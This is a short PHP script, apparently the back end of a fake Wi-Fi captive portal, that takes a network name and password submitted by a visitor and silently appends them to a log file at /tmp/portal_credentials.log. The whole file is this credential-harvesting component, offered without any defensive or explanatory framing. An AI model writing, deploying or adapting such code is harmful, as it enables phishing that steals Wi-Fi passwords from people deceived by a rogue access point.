<?php
$log_file = '/tmp/portal_credentials.log';
$password = $_POST['password'] ?? '';
$ssid = $_POST['ssid'] ?? 'Unknown';

if (!empty($password)) {
    file_put_contents($log_file, "[".date('Y-m-d H:i:s')."] SSID: $ssid | Password: $password\n", FILE_APPEND);
    echo json_encode(['success' => true]);
} else {
    echo json_encode(['success' => false]);
}
?>
